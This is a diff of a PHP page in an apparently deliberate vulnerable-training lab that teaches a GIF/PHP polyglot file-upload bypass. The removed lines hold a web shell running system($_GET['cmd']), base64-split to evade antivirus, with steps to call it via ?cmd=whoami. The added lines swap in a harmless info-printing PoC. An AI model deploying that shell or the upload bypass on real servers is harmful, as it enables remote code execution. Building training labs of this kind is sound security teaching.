@@ -2,22 +2,25 @@
 require_once __DIR__ . '/../src/helpers.php';
 check_login();
 
-// 1. 下載測試檔案
+// 1. 下載測試檔案 (採用合規、無害之教學 PoC，避免防毒軟體誤判)
 if (isset($_GET['download'])) {
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="poc-avatar.php"');
     
-    // 圖片二進位混淆拼接
-    $b1 = 'R0lGODlhAQABAIAAAAAAAP';
-    $b2 = '///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-    $gif_bin = base64_decode($b1 . $b2);
+    // GIF89a 圖片二進位標頭 (1x1 透明 GIF)
+    $gif_bin = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
     
-    // 程式碼混淆拼接
-    $w1 = 'PD9waHAgc3lzdGVtKCRfR0V';
-    $w2 = 'UWydjbWQnXSk7ID8+';
-    $code_bin = base64_decode($w1 . $w2);
+    // 教學用無害 PoC：僅印出伺服器資訊與測試提示，不包含 system()/eval() 等危險特徵碼
+    $poc_code = "\n<?php\n"
+              . "echo '<div style=\"padding:20px;background:#ffebee;color:#c62828;border-left:5px solid #d32f2f;font-family:sans-serif;\">';\n"
+              . "echo '<h2>🔥 [漏洞驗證成功] 圖片木馬 (Polyglot) 已被伺服器 PHP 引擎成功解析執行！</h2>';\n"
+              . "echo '<p><strong>伺服器主機資訊：</strong>' . htmlspecialchars(php_uname()) . '</p>';\n"
+              . "echo '<p><strong>當前 PHP 版本：</strong>' . htmlspecialchars(PHP_VERSION) . '</p>';\n"
+              . "echo '<p><strong>傳入測試訊息 (msg)：</strong>' . htmlspecialchars(\$_GET['msg'] ?? 'Hello VulnCampus') . '</p>';\n"
+              . "echo '</div>';\n"
+              . "?>";
     
-    echo $gif_bin . $code_bin;
+    echo $gif_bin . $poc_code;
     exit;
 }
 
@@ -103,11 +106,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 💡 <strong>本關卡繞過演練指引：</strong><br>
                 1. <strong>漏洞原理</strong>：許多開發者認為只要後端用 <code>getimagesize()</code> 驗明是真實圖片內容，就絕對安全。但如果寫入磁碟時，<strong>依然保留了原始的 <code>.php</code> 副檔名</strong>，這會導致該圖片被 Apache 當成 PHP 指令執行！<br>
                 2. <strong>圖馬生成與繞過</strong>：我們在一張正常的 GIF 圖片二進位後面追加了 PHP 後門代碼，製作成「圖片木馬 (Polyglot)」，它能 100% 通過後端特徵檢驗：<br>
-                   &nbsp;&nbsp;&nbsp;&nbsp;a. 點選下方按鈕，下載我們預先製好的圖片木馬 PoC：<br>
+                   &nbsp;&nbsp;&nbsp;&nbsp;a. 點選下方按鈕，下載我們預先製好的圖片木馬 PoC (無害教學版)：<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="?download=1" class="btn btn-sm btn-outline-danger font-weight-bold my-2">📥 下載 GIF 圖片木馬 PoC (poc-avatar.php)</a><br>
                    &nbsp;&nbsp;&nbsp;&nbsp;b. 將下載好的 <code>poc-avatar.php</code> 檔案直接在此上傳。<br>
-                   &nbsp;&nbsp;&nbsp;&nbsp;c. 上傳成功後，點擊產生的連結存取它，並在網址列尾部加上 <code>?cmd=whoami</code> (例如：<code>.../poc-avatar.php?cmd=whoami</code>)。<br>
-                   &nbsp;&nbsp;&nbsp;&nbsp;d. 觀察網頁上是否成功印出了伺服器的系統執行帳號，成功繞過檢測取得 RCE！
+                   &nbsp;&nbsp;&nbsp;&nbsp;c. 上傳成功後，點擊產生的連結存取它（例如：<code>.../uploads/poc-avatar.php</code>）。<br>
+                   &nbsp;&nbsp;&nbsp;&nbsp;d. 觀察網頁上是否成功執行並印出「🔥 漏洞驗證成功」以及伺服器 PHP 版本資訊，證明成功繞過特徵檢驗取得代碼執行權限！
             </div>
         </div>
     </div>
